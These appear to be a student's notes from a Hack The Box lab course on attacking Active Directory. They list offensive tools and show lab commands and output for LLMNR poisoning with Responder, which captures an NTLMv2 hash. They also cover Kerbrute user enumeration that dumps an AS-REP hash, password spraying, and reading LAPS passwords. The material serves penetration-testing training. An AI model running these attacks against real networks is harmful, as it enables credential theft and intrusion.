 Introduction to Active Directory Enumeration & Attacks

keylian zergainoh@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!

keylian zergainoh@htb[/htb]$ ssh htb-student@<ATTACK01 target IP>

keylian zergainoh@htb[/htb]$ xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!

https://github.com/dmchell/SharpView.git
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.

[BloodHound](https://github.com/BloodHoundAD/BloodHound)	
Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.

[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 	
The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.

[BloodHound.py 	](https://github.com/fox-it/BloodHound.py)
A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.

[Kerbrute](https://github.com/ropnop/kerbrute) 	
A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.

[Impacket toolkit](https://github.com/SecureAuthCorp/impacket) 	
A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.

[Responder](https://github.com/lgandx/Responder)
Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.

[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) 	
Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.

[C# Inveigh (InveighZero) 	](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)
The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.

[rpcinfo 	](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)
The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.

[rpcclient 	](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.

[CrackMapExec (CME) 	](https://github.com/byt3bl33d3r/CrackMapExec)
CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.

[Rubeus](https://github.com/GhostPack/Rubeus) 	
Rubeus is a C# tool built for Kerberos Abuse.

[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
Another Impacket module geared towards finding Service Principal names tied to normal users.

[Hashcat 	](https://hashcat.net/hashcat/)
A great hash cracking and password recovery tool.

[enum4linux ](https://github.com/CiscoCXSecurity/enum4linux)
A tool for enumerating information from Windows and Samba systems.

[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)
A rework of the original Enum4linux tool that works a bit differently.

[ldapsearch 	](https://linux.die.net/man/1/ldapsearch)
Built-in interface for interacting with the LDAP protocol.

[windapsearch 	](https://github.com/ropnop/windapsearch)
A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.

[DomainPasswordSpray.ps1 	](https://github.com/dafthack/DomainPasswordSpray)
DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.

[LAPSToolkit 	](https://github.com/leoloobeek/LAPSToolkit)
The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).

[smbmap ](https://github.com/ShawnDEvans/smbmap)
SMB share enumeration across a domain.

[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.

[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
Part of the Impacket toolkit, it provides the capability of command execution over WMI.

[Snaffler 	](https://github.com/SnaffCon/Snaffler)
Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.

[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)
Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.

[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))
Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

[Mimikatz ](https://github.com/ParrotSec/mimikatz)
Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
Remotely dump SAM and LSA secrets from a host.

[evil-winrm](https://github.com/Hackplayers/evil-winrm)
Provides us with an interactive shell on a host over the WinRM protocol.

[mssqlclient.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.

[noPac.py](https://github.com/Ridter/noPac)
Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.

[rpcdump.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)
Part of the Impacket toolset, RPC endpoint mapper.

[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)
Printnightmare PoC in python.
[
ntlmrelayx.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
Part of the Impacket toolset, it performs SMB relay attacks.

[PetitPotam.py 	](https://github.com/topotam/PetitPotam)
PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.

[gettgtpkinit.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
Tool for manipulating certificates and TGTs.

[getnthash.py 	](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)
This tool will use an existing TGT to request a PAC for the current user using U2U.

[adidnsdump ](https://github.com/dirkjanm/adidnsdump)
A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.

[gpp-decrypt 	](https://github.com/t0thkr1s/gpp-decrypt)
Extracts usernames and passwords from Group Policy preferences files.
[
GetNPUsers.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.

[lookupsid.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)
SID bruteforcing tool.

[ticketer.py 	](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.

[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.

[Active Directory Explorer 	](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.

[PingCastle](https://www.pingcastle.com/documentation/)
Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).

[Group3r](https://github.com/Group3r/Group3r)
Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).

[ADRecon 	](https://github.com/adrecon/ADRecon)
A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.

```
keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
```

```
sudo responder -I ens224 -A
```

```
keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```

```
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds

```
```
ifconfig                                                                                                                                                            
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:30:d9:b2:11  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.225.134  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::f6ff:1908:eacf:8269  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::e79b:94bf:10e9:62b1  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:cb:1b  txqueuelen 1000  (Ethernet)
        RX packets 2109  bytes 249773 (243.9 KiB)
        RX errors 0  dropped 100  overruns 0  frame 0
        TX packets 796  bytes 112882 (110.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:f6:d6  txqueuelen 1000  (Ethernet)
        RX packets 66800  bytes 4451108 (4.2 MiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 58933  bytes 4354434 (4.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6UNMJVF6525]
    Responder Domain Name      [IRTA.LOCAL]
    Responder DCE-RPC Port     [48360]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...                                                                                                                                               

[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[MSSQL] NTLMv2 Client   : 172.16.5.130
[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:4aefe98c2befd788:193DEA5E4A4EB9F41ABC813C57F52A52:0101000000000000ABEE2646896DDB0186215D3ADAB2B6560000000002000800490052005400410001001E00570049004E002D00360055004E004D004A005600460036003500320035000400140049005200540041002E004C004F00430041004C0003003400570049004E002D00360055004E004D004A005600460036003500320035002E0049005200540041002E004C004F00430041004C000500140049005200540041002E004C004F00430041004C000800300030000000000000000000000000300000E3A522B26D265DC9C530A9F499332569AC2F333F2A78B1254A01CE6E5A29E9AB0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 
........................................

```

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
rpcclient -U "" -N 172.16.5.5
crackmapexec smb 172.16.5.5 --users
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
```
kerbrute userenum -d INLANEFREIGHT --dc INLANEFREIGHT.LOCAL jsmith.txt                                                         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/23/25 - Ronnie Flathers @ropnop

2025/01/23 09:20:52 >  Using KDC(s):
2025/01/23 09:20:52 >   INLANEFREIGHT.LOCAL:88

2025/01/23 09:20:52 >  [+] VALID USERNAME:  jjones@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  sbrown@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwilson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tjohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  bdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  njohnson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  asanchez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  dlewis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  ccruz@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:232d64acb8a1f491a6fd11513d0881c3$1eadf75b0e3e9e6a6618f056a759aea61af09da3bee3e07b0cd00c8b6c1602d20bef71dfacd85468aa32f60a4e27185023472f8b7367faa2c97adbb4c90bd6a413ec54917a62103bedd6049711716cec6a3363b1b6ab6c602aa0f429fbe7dfec1dfe0770c5d32bedff09ae139d64d9abb81b16b3b588b449d8f5d8a3e78556a8f14ccb841025f074ed49402414cb1834efef5fe21dfef361cd0f18946310aaa2c49c6090d54fe16f8afcf480dfe8416271bbee0cfbc03309b4539e2bf839e28d3841202751601c3ffb8616a1eb4acf42a07a69be3c6a15ddbf87bd9f5311100807ed61b84f385ea7d89c47bb0b35f5cd0f93d09c06b76bd2afb877a46c2ca983ba0fff17                                                                                     
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mmorgan@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  rramirez@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jwallace@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jsantiago@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  gdavis@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mrichardson@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  mharrison@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  tgarcia@INLANEFREIGHT
2025/01/23 09:20:52 >  [+] VALID USERNAME:  jmay@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmontgomery@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jhopkins@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  dpayne@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mhicks@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  adunn@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  lmatthews@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  avazquez@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mlowe@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  jmcdaniel@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  csteele@INLANEFREIGHT
2025/01/23 09:20:53 >  [+] VALID USERNAME:  mmullins@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  mochoa@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  aslater@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehoffman@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  ehamilton@INLANEFREIGHT
2025/01/23 09:20:54 >  [+] VALID USERNAME:  cpennington@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  srosario@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  lbradford@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  halvarez@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  gmccarthy@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  dbranch@INLANEFREIGHT
2025/01/23 09:20:55 >  [+] VALID USERNAME:  mshoemaker@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  mholliday@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  ngriffith@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  sinman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  minman@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rhester@INLANEFREIGHT
2025/01/23 09:20:56 >  [+] VALID USERNAME:  rburrows@INLANEFREIGHT
2025/01/23 09:20:57 >  [+] VALID USERNAME:  dpalacios@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  strent@INLANEFREIGHT
2025/01/23 09:20:58 >  [+] VALID USERNAME:  fanthony@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  evalentin@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  sgage@INLANEFREIGHT
2025/01/23 09:20:59 >  [+] VALID USERNAME:  jshay@INLANEFREIGHT
2025/01/23 09:21:00 >  [+] VALID USERNAME:  jhermann@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  whouse@INLANEFREIGHT
2025/01/23 09:21:01 >  [+] VALID USERNAME:  emercer@INLANEFREIGHT
2025/01/23 09:21:02 >  [+] VALID USERNAME:  wshepherd@INLANEFREIGHT
2025/01/23 09:21:03 >  Done! Tested 48705 usernames (56 valid) in 11.225 seconds
```
```
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

```Checking the Status of Defender with Get-MpComputerStatus
Enumerating Security Controls

PS C:\htb> Get-MpComputerStatus

AMEngineVersion                 : 1.1.17400.5
AMProductVersion                : 4.10.14393.0
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.0
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 9/2/2020 11:31:50 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 9/2/2020 11:31:51 AM
AntivirusSignatureVersion       : 1.323.392.0
BehaviorMonitorEnabled          : False
ComputerID                      : 07D23A51-F83F-4651-B9ED-110FF2B83A9C
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 2
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 0
QuickScanEndTime                : 9/3/2020 12:50:45 AM
QuickScanStartTime              : 9/3/2020 12:49:49 AM
RealTimeProtectionEnabled       : True
RealTimeScanDirection           : 0
PSComputerName                  :
```

```
Using Get-AppLockerPolicy cmdlet
Enumerating Security Controls

PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

```

Enumerating Language Mode
Enumerating Security Controls
```
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```

```
Using Find-LAPSDelegatedGroups
Enumerating Security Controls

PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
```

```Using Get-LAPSComputers
Enumerating Security Controls

PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```

```
rpcclient $> enumdomusers
queryuser 0x492
enumdomgroups
querygroup 0xff0
```

```

Get-Module
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...


Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
